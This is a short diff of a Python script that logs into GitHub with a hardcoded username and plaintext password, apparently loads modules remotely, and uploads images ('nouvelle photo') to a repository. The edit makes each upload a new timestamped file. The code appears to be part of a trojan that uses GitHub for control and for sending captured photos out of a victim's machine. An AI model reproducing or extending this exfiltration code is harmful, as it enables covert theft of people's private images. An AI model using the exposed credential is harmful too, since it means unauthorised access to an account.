@@ -7,7 +7,6 @@ import time
 import os
 from github3 import login
 from subprocess import call
-import urllib
 
 def connect_to_github() :
 	gh = login("mehdi-desu",password="1090prixttc")
@@ -44,7 +43,7 @@ def load_module(name):
 
 def send(img):
 	gh,repo,branch = connect_to_github()
-	repo.create_file("data/p.png","nouvelle photo",img)
+	repo.create_file("data/"+time.strftime('%s')+".png","nouvelle photo",img)
 
 
 
